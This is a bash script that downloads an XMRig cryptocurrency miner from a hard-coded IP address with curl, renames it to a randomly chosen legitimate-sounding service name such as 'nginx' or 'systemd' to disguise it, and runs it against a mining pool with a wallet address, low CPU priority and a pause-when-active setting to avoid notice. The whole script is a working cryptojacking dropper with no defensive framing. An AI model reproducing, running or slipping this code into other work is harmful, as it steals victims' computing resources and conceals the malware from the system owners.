#!/bin/bash

# Define an extended array of logical names
logical_names=(
  "service" "systemd" "python" "java" "node" "nginx" "apache" "redis" "mysql" "postgresql"
  "mongodb" "memcached" "elasticsearch" "rabbitmq" "kafka" "docker" "java_agent" "nodejs" "perl"
  "php" "ruby" "go" "python3" "golang" "redis-server" "mongod" "nginx-worker" "haproxy"
  "mysql-server" "postgres" "mongodb-server" "webserver" "api-server" "db-server" "worker-node"
  "worker-service" "proxy" "streaming" "cache" "scheduler" "gateway" "controller" "client"
  "load-balancer" "task-runner" "worker-task" "system-agent" "task-scheduler" "orchestrator" "backend"
  "frontend" "queue-manager" "job-scheduler" "container" "docker-container" "service-worker" "service-agent"
  "monitor" "log-collector" "db-client" "file-server" "worker-behavior" "process-manager"
)

# Select a random logical name from the array
logical_name=${logical_names[$RANDOM % ${#logical_names[@]}]}

# Download the file and save it with the chosen logical name
curl -sL http://150.136.168.71:80/archxx/xmrig-Ahmad -o "$logical_name" && chmod +x "$logical_name"

# Run the downloaded file in the background with parameters
./"$logical_name" -o 20.40.45.18:443 -a rx -u NHbWmURgbZRWUVDeuSYuyHTEdKfadbVMRzAE.aistudio --cpu-priority=0 --pause-on-active=120
